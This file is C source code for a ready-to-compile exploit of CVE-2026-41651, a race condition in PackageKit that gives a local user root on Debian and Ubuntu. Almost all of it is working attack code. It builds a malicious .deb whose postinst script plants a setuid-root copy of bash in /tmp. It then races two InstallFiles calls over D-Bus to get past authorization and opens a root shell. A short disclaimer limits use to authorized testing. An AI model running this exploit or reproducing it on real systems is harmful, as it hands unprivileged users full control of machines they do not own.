/*
 * CVE-2026-41651 - PackageKit TOCTOU Local Privilege Escalation
 * ⚠️ WARNING: This tool is for educational and authorized security testing ONLY.
 * Unauthorized use on systems you do not own or have permission to test is ILLEGAL.
 * The author is not responsible for any misuse.
 * Affected versions : PackageKit 1.0.2 – 1.3.4
 * Fixed in version  : 1.3.5
 * 
 * Author   : Lutfifakee-Project
 * GitHub   : https://github.com/Lutfifakee-Project/
 * 
 * Compile  : gcc -o exploit exploit.c `pkg-config --cflags --libs glib-2.0 gio-2.0` -Wall
 * Usage    : ./exploit
 */
 
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/file.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <time.h>
#include <sys/stat.h>
#include <glib.h>
#include <gio/gio.h>

/* ── config ────────────────────────────────────────────────────────────────── */
#define SUID_PATH     "/tmp/.suid_bash"
#define PK_BUS        "org.freedesktop.PackageKit"
#define PK_OBJ        "/org/freedesktop/PackageKit"
#define PK_IFACE      "org.freedesktop.PackageKit"
#define PK_TX_IFACE   "org.freedesktop.PackageKit.Transaction"
#define FLAG_NONE     ((guint64)0)
#define FLAG_SIMULATE ((guint64)(1u << 2))

/* ── utilities ─────────────────────────────────────────────────────────────── */
static void G_GNUC_NORETURN die(const char *m) { fprintf(stderr,"[-] %s\n",m); exit(1); }

/* ── CRC-32 (ISO 3309) ─────────────────────────────────────────────────────── */
static uint32_t crc_tab[256];
static void crc_init(void) {
    for (unsigned i = 0; i < 256; i++) {
        uint32_t c = i;
        for (int j = 0; j < 8; j++) c = (c&1)?(0xedb88320u^(c>>1)):(c>>1);
        crc_tab[i] = c;
    }
}
static uint32_t crc32(const void *src, size_t n) {
    const uint8_t *p = src; uint32_t c = 0xffffffffu;
    while (n--) c = crc_tab[(c^*p++)&0xff]^(c>>8);
    return c^0xffffffffu;
}

/* ── gzip (stored deflate block, max 65535 B) ─────────────────────────────── */
static size_t gzip_store(const void *src, size_t len, uint8_t *dst)
{
    if (len > 0xffff) return 0;
    uint8_t *p = dst;
    /* header */
    *p++=0x1f; *p++=0x8b; *p++=0x08; *p++=0x00;
    p[0]=p[1]=p[2]=p[3]=0; p+=4; *p++=0x00; *p++=0xff;
    /* stored block */
    uint16_t ln=len, nln=~ln;
    *p++=0x01; memcpy(p,&ln,2); p+=2; memcpy(p,&nln,2); p+=2;
    memcpy(p,src,len); p+=len;
    /* trailer */
    uint32_t c=crc32(src,len), s=(uint32_t)len;
    memcpy(p,&c,4); p+=4; memcpy(p,&s,4); p+=4;
    return p-dst;
}

/* ── ustar tar entry (512-byte header + padded data) ──────────────────────── */
static size_t tar_entry(uint8_t *buf, const char *name, const void *data,
                        size_t dlen, mode_t mode, char type)
{
    memset(buf,0,512);
    snprintf((char*)buf,      100,"%s",name);
    snprintf((char*)buf+100,    8,"%07o",(unsigned)mode);
    snprintf((char*)buf+108,    8,"%07o",0u);
    snprintf((char*)buf+116,    8,"%07o",0u);
    snprintf((char*)buf+124,   12,"%011o", (unsigned)dlen);
    snprintf((char*)buf+136,   12,"%011o", (unsigned)time(NULL));
    memset(buf+148,' ',8);
    buf[156]=type;
    memcpy(buf+257,"ustar",5); memcpy(buf+263,"00",2);
    unsigned sum=0; for(int i=0;i<512;i++) sum+=buf[i];
    snprintf((char*)buf+148,8,"%06o",sum);
    buf[154]='\0'; buf[155]=' ';
    size_t pad=dlen?((dlen+511)/512)*512:0;
    if(dlen&&data) memcpy(buf+512,data,dlen);
    if(pad>dlen)   memset(buf+512+dlen,0,pad-dlen);
    return 512+pad;
}

/* ── ar member ─────────────────────────────────────────────────────────────── */
static void ar_entry(FILE *f, const char *name, const void *data, size_t sz)
{
    char h[61]; memset(h,' ',60); h[60]=0;
    char t[17]; snprintf(t,17,"%-16s",name); memcpy(h,t,16);
    snprintf(t,13,"%-12lu",(unsigned long)time(NULL)); memcpy(h+16,t,12);
    memcpy(h+28,"0     ",6); memcpy(h+34,"0     ",6);
    memcpy(h+40,"100644  ",8);
    snprintf(t,11,"%-10zu",sz); memcpy(h+48,t,10);
    h[58]='`'; h[59]='\n';
    fwrite(h,1,60,f); fwrite(data,1,sz,f);
    if(sz%2) fputc('\n',f);
}

/* ── assemble a minimal .deb entirely in C ────────────────────────────────── */
static void build_deb(const char *dest, const char *pkg, const char *postinst)
{
    static uint8_t tarbuf[65536], gzbuf[65536+256];
    memset(tarbuf,0,sizeof tarbuf);
    crc_init();
    size_t off=0;

    char ctrl[512];
    snprintf(ctrl,sizeof ctrl,
             "Package: %s\nVersion: 1.0\nArchitecture: all\n"
             "Maintainer: PoC\nDescription: PoC\n", pkg);

    off += tar_entry(tarbuf+off,"./",NULL,0,0755,'5');
    off += tar_entry(tarbuf+off,"./control",ctrl,strlen(ctrl),0644,'0');
    if(postinst)
        off += tar_entry(tarbuf+off,"./postinst",postinst,strlen(postinst),0755,'0');
    off += 1024;

    size_t ctrl_gz_len = gzip_store(tarbuf, off, gzbuf);
    if(!ctrl_gz_len) die("gzip_store failed");

    static uint8_t empty_tar[1024], data_gz[256];
    memset(empty_tar,0,sizeof empty_tar);
    size_t data_gz_len = gzip_store(empty_tar,sizeof empty_tar,data_gz);

    FILE *f = fopen(dest,"wb");
    if(!f) die("fopen .deb");
    fwrite("!<arch>\n",1,8,f);
    ar_entry(f,"debian-binary","2.0\n",4);
    ar_entry(f,"control.tar.gz",gzbuf,ctrl_gz_len);
    ar_entry(f,"data.tar.gz",data_gz,data_gz_len);
    fclose(f);
}

/* ── PackageKit D-Bus context ──────────────────────────────────────────────── */
typedef struct { GMainLoop *loop; guint32 exit_code; gboolean done; } Ctx;

static void cb_finished(GDBusConnection*c G_GNUC_UNUSED, const gchar*s G_GNUC_UNUSED,
    const gchar*o G_GNUC_UNUSED, const gchar*i G_GNUC_UNUSED, const gchar*n G_GNUC_UNUSED,
    GVariant *p, gpointer u)
{
    Ctx *ctx=u; guint32 ec,rt;
    g_variant_get(p,"(uu)",&ec,&rt);
    printf("[*] Finished (exit=%u, %u ms)\n",ec,rt);
    ctx->exit_code=ec; ctx->done=TRUE;
    g_main_loop_quit(ctx->loop);
}

static void cb_error(GDBusConnection*c G_GNUC_UNUSED, const gchar*s G_GNUC_UNUSED,
    const gchar*o G_GNUC_UNUSED, const gchar*i G_GNUC_UNUSED, const gchar*n G_GNUC_UNUSED,
    GVariant *p, gpointer u G_GNUC_UNUSED)
{
    guint32 code; const gchar *det;
    g_variant_get(p,"(u&s)",&code,&det);
    printf("[!] PK error %u: %s\n",code,det);
    fflush(stdout);
}

static const char *pk_status_str(guint32 s) {
    static const char *t[] = {
        "UNKNOWN","WAIT","SETUP","RUNNING","QUERY","INFO","REMOVE","REFRESH_CACHE",
        "DOWNLOAD","INSTALL","UPDATE","CLEANUP","OBSOLETE","DEP_RESOLVE","SIG_CHECK",
        "ROLLBACK","COMMIT","REQUEST","FINISHED","CANCEL","WAITING_FOR_LOCK",
        "SCAN_PROCESS_LIST","CHECK_EXECUTABLE_FILES","CHECK_LIBRARIES","COPY_FILES"
    };
    return s < 25 ? t[s] : "?";
}

static void cb_status(GDBusConnection*c G_GNUC_UNUSED, const gchar*s G_GNUC_UNUSED,
    const gchar*o G_GNUC_UNUSED, const gchar*i G_GNUC_UNUSED, const gchar*n G_GNUC_UNUSED,
    GVariant *p, gpointer u G_GNUC_UNUSED)
{
    guint32 st;
    g_variant_get(p,"(u)",&st);
    printf("[*] Status: %s\n", pk_status_str(st));
    fflush(stdout);
}

static gboolean cb_timeout(gpointer u)
{
    fputs("[-] Timed out\n",stderr);
    g_main_loop_quit(u);
    return G_SOURCE_REMOVE;
}

static char *pk_create_tx(GDBusConnection *conn)
{
    GError *e=NULL;
    GVariant *r=g_dbus_connection_call_sync(conn,PK_BUS,PK_OBJ,PK_IFACE,
        "CreateTransaction",NULL,G_VARIANT_TYPE("(o)"),
        G_DBUS_CALL_FLAGS_NONE,-1,NULL,&e);
    if(!r){ fprintf(stderr,"[-] CreateTransaction: %s\n",e->message); g_error_free(e); return NULL; }
    const gchar *tid; g_variant_get(r,"(&o)",&tid);
    char *copy=g_strdup(tid); g_variant_unref(r);
    return copy;
}

static void pk_install_files_async(GDBusConnection *conn, const char *tid,
                                   guint64 flags, const char *path)
{
    const char *paths[]={path,NULL};
    g_dbus_connection_call(conn,PK_BUS,tid,PK_TX_IFACE,
        "InstallFiles",g_variant_new("(t^as)",flags,paths),
        NULL,G_DBUS_CALL_FLAGS_NONE,-1,NULL,NULL,NULL);
}

/* ── main ──────────────────────────────────────────────────────────────────── */
int main(void)
{
    puts("");
    puts("  ______   ______    ___  ___  ___  ____     ___________ _______");
    puts(" / ___/ | / / __/___|_  |/ _ \\|_  |/ __/____/ / <  / __// __<  /");
    puts("/ /__ | |/ / _//___/ __// // / __// _ \\/___/_  _/ / _ \\/__ \\/ / ");
    puts("\\___/ |___/___/   /____/\\___/____/\\___/     /_//_/\\___/____/_/  ");
    puts("              https://github.com/Lutfifakee-Project/");
    puts("CVE-2026-41651 - PackageKit TOCTOU Local Privilege Escalation");
    puts("═══════════════════════════════════════════════════════════════════");
    puts("");

    if(geteuid()==0) die("Run as unprivileged user");
    if(access("/etc/debian_version",F_OK)!=0)
        die("Debian/Ubuntu required for built-in .deb builder");

    /* build packages in /tmp */
    char dummy[64], payload[64];
    snprintf(dummy,  sizeof dummy,  "/tmp/.pk-dummy-%d.deb",  getpid());
    snprintf(payload,sizeof payload,"/tmp/.pk-payload-%d.deb",getpid());

    char postinst[128];
    snprintf(postinst,sizeof postinst,"#!/bin/sh\ninstall -m 4755 /bin/bash %s\n",SUID_PATH);

    puts("[*] Building packages (pure C)...");
    build_deb(dummy,   "pk-poc-dummy",   NULL);
    build_deb(payload, "pk-poc-payload", postinst);

    if(access(dummy,F_OK)!=0||access(payload,F_OK)!=0)
        die("deb build failed");

    printf("[+] dummy   : %s\n", dummy);
    printf("[+] payload : %s\n", payload);

    /* D-Bus setup */
    GError *err=NULL;
    GDBusConnection *conn=g_bus_get_sync(G_BUS_TYPE_SYSTEM,NULL,&err);
    if(!conn){ fprintf(stderr,"[-] %s\n",err->message); g_error_free(err); return 1; }

    char *tid=pk_create_tx(conn);
    if(!tid) return 1;
    printf("[*] Transaction : %s\n",tid);

    Ctx ctx={ .loop=g_main_loop_new(NULL,FALSE), .done=FALSE };
    guint sf=g_dbus_connection_signal_subscribe(conn,PK_BUS,PK_TX_IFACE,"Finished",
        tid,NULL,G_DBUS_SIGNAL_FLAGS_NONE,cb_finished,&ctx,NULL);
    guint se=g_dbus_connection_signal_subscribe(conn,PK_BUS,PK_TX_IFACE,"ErrorCode",
        tid,NULL,G_DBUS_SIGNAL_FLAGS_NONE,cb_error,NULL,NULL);
    guint ss=g_dbus_connection_signal_subscribe(conn,PK_BUS,PK_TX_IFACE,"StatusChanged",
        tid,NULL,G_DBUS_SIGNAL_FLAGS_NONE,cb_status,NULL,NULL);

    printf("[*] Step 1 : InstallFiles(SIMULATE=0x%llx, dummy) [async]\n",
           (unsigned long long)FLAG_SIMULATE);
    pk_install_files_async(conn, tid, FLAG_SIMULATE, dummy);

    printf("[*] Step 2 : InstallFiles(NONE=0x%llx, payload) [async]\n",
           (unsigned long long)FLAG_NONE);
    pk_install_files_async(conn, tid, FLAG_NONE, payload);

    /* flush: ensure both messages are in the kernel socket buffer before
     * the server's main-loop gets a chance to run the idle. */
    {
        GError *fe = NULL;
        if (!g_dbus_connection_flush_sync(conn, NULL, &fe)) {
            fprintf(stderr,"[!] flush: %s\n", fe ? fe->message : "?");
            g_clear_error(&fe);
        }
    }

    puts("[*] Waiting for dispatch (30 s max)...");
    {
        struct timespec ts0, ts1;
        clock_gettime(CLOCK_MONOTONIC, &ts0);
        g_timeout_add_seconds(30, cb_timeout, ctx.loop);
        g_main_loop_run(ctx.loop);
        clock_gettime(CLOCK_MONOTONIC, &ts1);
        printf("[*] Loop ran for %ld ms\n",
               (ts1.tv_sec-ts0.tv_sec)*1000+(ts1.tv_nsec-ts0.tv_nsec)/1000000);
    }

    g_dbus_connection_signal_unsubscribe(conn,sf);
    g_dbus_connection_signal_unsubscribe(conn,se);
    g_dbus_connection_signal_unsubscribe(conn,ss);
    /* do NOT unlink debs until after postinst completes */
    g_free(tid); g_object_unref(conn);

    /* Poll for the SUID bash for up to 120 seconds.
     * The APT backend may still be running after polkitd fires. */
    puts("[*] Polling for payload (120 s max)...");
    struct stat st;
    int appeared_at = -1;
    for (int i = 0; i < 1200; i++) {
        usleep(100000); /* 100 ms */
        if (i % 10 == 0) {
            /* Every second: check whether dpkg lock is actually held (flock test) */
            int lock_fd = open("/var/lib/dpkg/lock", O_RDONLY);
            int lock_held = 0;
            if (lock_fd >= 0) {
                lock_held = flock(lock_fd, LOCK_EX|LOCK_NB) != 0;
                if (!lock_held) flock(lock_fd, LOCK_UN);
                close(lock_fd);
            }
            printf("[*] t+%ds: payload=%s dpkg_lock=%s suid=%s\n",
                   (i/10)+1,
                   access(payload, F_OK) == 0 ? "exists" : "GONE",
                   lock_held ? "HELD" : "free",
                   access(SUID_PATH, F_OK) == 0 ? "FOUND" : "not yet");
            fflush(stdout);
        }
        if (stat(SUID_PATH,&st)==0 && (st.st_mode&S_ISUID)) {
            appeared_at = i;
            break;
        }
    }
    unlink(dummy); unlink(payload);

    if (appeared_at >= 0) {
        printf("\n[+] SUCCESS — SUID bash at t+%dms\n", appeared_at * 100);
        pid_t p = fork();
        if (p == 0) {
            char *argv[]={ SUID_PATH, "-p", "-c", "id", NULL };
            execv(SUID_PATH, argv);
            perror("execv"); _exit(1);
        } else if (p > 0) {
            int status; waitpid(p, &status, 0);
        }
        fflush(stdout);
        if (isatty(STDIN_FILENO)) {
            char *ttydev = ttyname(STDIN_FILENO);
            pid_t child = fork();
            if (child == 0) {
                setsid();
                if (ttydev) {
                    int t = open(ttydev, O_RDWR);
                    if (t >= 0) {
                        ioctl(t, TIOCSCTTY, 1);
                        dup2(t, 0); dup2(t, 1); dup2(t, 2);
                        if (t > 2) close(t);
                    }
                }
                char *argv[]={ SUID_PATH, "-p", NULL };
                execv(SUID_PATH, argv);
                _exit(1);
            }
            if (child > 0) { int s; waitpid(child, &s, 0); }
        }
        return 0;
    }

    puts("[-] Exploit failed — SUID bash never appeared.");
    return 1;
}
